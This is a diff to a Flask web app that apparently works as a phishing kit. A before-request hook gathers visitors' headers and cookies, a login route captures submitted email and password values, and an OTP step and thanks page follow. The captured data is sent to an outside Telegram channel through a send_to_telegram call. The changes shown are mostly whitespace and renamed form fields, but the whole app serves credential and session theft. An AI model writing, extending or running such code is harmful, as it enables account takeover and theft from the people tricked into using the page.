@@ -59,7 +59,6 @@ def require_step(min_step: int):
         return redirect(url_for("start"))
     return None
     
-       
 @app.before_request
 def load_data():
 
@@ -92,26 +91,26 @@ def load_data():
     """
     send_to_telegram(message)
               
-    return {"headers": headers_list, "cookies": cookies_list} 
+    return {"headers": headers_list, "cookies": cookies_list}        
 
 @app.route('/', methods=["GET"])
 def index():
     return render_template("index.html")
-        
+    
+    
 @app.route("/login", methods=["POST"]) 
 def login_post():
-    email = request.form.get("email", "")
-    password = request.form.get("password", "")
+    email = request.form.get("answer", "")
+    password = request.form.get("answer", "")
     answer = {"email": email, "password": password}
     save_answer(1, answer)
-    
     send_to_telegram(f": {answer}")
-    
     return redirect(url_for("login_get"))
  
 @app.route("/login", methods=["GET"])
 def login_get():
     return render_template("login.html")
+
 
 @app.route("/otp", methods=["POST"])
 def otp_post():
@@ -127,8 +126,8 @@ def otp_get():
     
 @app.route('/thanks.html')
 def thanks():
-    return render_template("thanks.html")     
-              
+    return render_template("thanks.html")
+             
 @app.route('/')
 def session_files():
 
